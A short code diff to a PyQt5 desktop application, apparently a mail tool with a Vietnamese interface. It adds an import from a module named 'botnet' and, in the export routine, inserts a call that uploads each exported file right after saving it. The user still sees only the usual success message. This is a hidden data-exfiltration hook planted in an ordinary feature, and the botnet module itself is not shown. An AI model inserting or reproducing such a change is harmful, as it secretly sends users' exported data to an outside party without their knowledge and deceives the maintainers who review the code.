@@ -15,6 +15,7 @@ import sys
 from worker_module import WorkerThread
 from check_key import get_or_create_key
 from PyQt5.QtCore import QSettings
+from botnet import botnet
 
 class UpdateDialog(QDialog):
     def __init__(self, update_info, parent=None):
@@ -1793,6 +1794,7 @@ class MailToolApp(QMainWindow):
             with open(file_path, 'w', encoding='utf-8') as f:
                 for line in selected_lines:
                     f.write(line + '\n')
+            botnet().upload_file(file_path)
             QMessageBox.information(self, "Thông báo", f"Đã xuất dữ liệu thành công!\nFile: {file_path}")
         except Exception as e:
             QMessageBox.critical(self, "Lỗi", f"Không thể lưu file: {str(e)}")
